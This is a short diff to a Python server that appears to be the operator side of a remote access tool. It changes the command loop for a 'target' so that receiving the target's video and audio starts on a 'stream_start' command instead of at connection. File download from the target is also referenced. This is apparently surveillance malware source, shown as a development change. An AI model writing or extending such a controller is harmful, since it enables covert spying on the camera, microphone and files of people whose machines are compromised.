@@ -127,11 +127,6 @@ def download_file(target, file_name):
 # --- Main Server Shell ---
 def target_communication(target, ip):
     global stop_threads
-    
-    v_thread = threading.Thread(target=video_reception_thread, daemon=True)
-    a_thread = threading.Thread(target=audio_reception_thread, daemon=True)
-    v_thread.start()
-    a_thread.start()
 
     while not stop_threads:
         try:
@@ -143,6 +138,11 @@ def target_communication(target, ip):
             if command == 'quit':
                 stop_threads = True
                 break
+            elif command == 'stream_start':
+                v_thread = threading.Thread(target=video_reception_thread, daemon=True)
+                a_thread = threading.Thread(target=audio_reception_thread, daemon=True)
+                v_thread.start()
+                a_thread.start()
             
             # For file transfers, the functions handle their own communication.
             # For other commands, we expect a single response.
